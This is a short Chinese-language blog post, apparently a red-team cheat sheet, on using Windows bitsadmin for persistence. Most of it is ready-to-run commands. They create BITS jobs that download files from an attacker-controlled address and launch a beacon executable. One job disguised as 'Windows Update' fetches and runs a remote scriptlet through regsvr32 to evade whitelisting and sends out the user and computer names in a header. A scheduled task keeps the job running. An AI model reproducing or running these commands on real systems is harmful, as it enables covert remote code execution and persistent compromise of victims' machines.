---
title: Persistence Bitsadmin
date: 2023-09-13T16:32:30+08:00
draft: false
url: /posts/2023-09-13/Bitsadmin
tags:
  - Bitsadmin
  - Windows
  - Persistence
---

## 0x00 前言

Persistence bitsadmin

## 0x01 bitsadmin

Microsoft 提供了一个名为“ **bitsadmin** ”的二进制文件和 PowerShell cmdlet，用于创建和管理文件传输

### 基础命令

#### 显示所有用户的 BITS 任务列表

```cmd
# 包括活动任务和已完成任务
bitsadmin /list /allusers

# 更详细的信息
bitsadmin /list /allusers /verbose
```

### 删除任务

```cmd
bitsadmin /cancel <Job Name>
```

## 0x02 下载方式

### Cmd

```cmd
bitsadmin /transfer backdoor /download /priority high http://IP:Port/Filename <path to executable>
```

### PowerShell

```powershell
Start-BitsTransfer -Source "http://IP:Port/Filename" -Destination "<path to executable>"
```

## 0x03 利用方法

将文件写入磁盘后，可以通过从“ **bitsadmin** ”实用程序执行以下命令来实现持久化

1. 创建参数需要作业的名称
2. addfile需要文件的远程位置和本地路径
3. SetNotifyCmdLine将执行的命令
4. SetMinRetryDelay定义回调的时间（以秒为单位）
5. resume参数将运行位作业。

```cmd
bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://IP:Port/Filename"  "<path to executable>"
bitsadmin /SetNotifyCmdLine backdoor C:\tmp\beacon.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60
bitsadmin /resume backdoor
```

### SetNotifyCmdLine

**SetNotifyCmdLine** 参数还可用于通过[regsvr32](https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/)实用程序从远程位置执行 scriptlet。这种方法的好处是不接触磁盘，可以绕过白名单

```cmd
# Usage
bitsadmin /setnotifycmdline <job> <program_name> [program_parameters]
bitsadmin /resume backdoor

# 创建一个新的Job,命名为Windows Update
bitsadmin /Create "Windows Update"

# 指定一个下载任务和下载的地址
bitsadmin /AddFile "Windows Update" "http://192.168.19.129:8080/hXvPWuHBr.sct" "C:\scrobj.dll"

# 设置触发事件的条件
bitsadmin /SetNotifyFlags "Windows Update" 1

# 设置作业完成数据传输或作业进入状态将运行的命令行程序
bitsadmin /SetNotifyCmdLine "Windows Update" "%COMSPEC%" "cmd.exe /c bitsadmin.exe /complete \"Windows Update\" && start /B regsvr32 /s /n /u /i:http://192.168.19.129:8080/hXvPWuHBr.sct scrobj.dll"

# 设置下载任务出错时重传的延迟
bitsadmin /SetMinRetryDelay "Windows Update" 60

# 添加自定义的HTTP头
bitsadmin /SetCustomHeaders "Windows Update" "Caller:%USERNAME%@%COMPUTERNAME"

# 激活新的任务
bitsadmin /Resume "Windows Update" 

# 使用schtasks命令建立计划任务来加载bitsadmin执行”Windows Update“
schtasks /Create /TN "Windows Update" /TR "%WINDIR%\system32\bitsadmin.exe /resume \"Windows Update\"" /sc minute /MO 30 /ED(此任务的最后一次运行时间) 2023/08/30 /ET 00:00(最后一次的运行时间) /Z(在任务运行完毕后删除任务) /IT(标志此任务只有在登录情况下才运行) /RU %USERNAME%(指定运行的用户账户)  
```
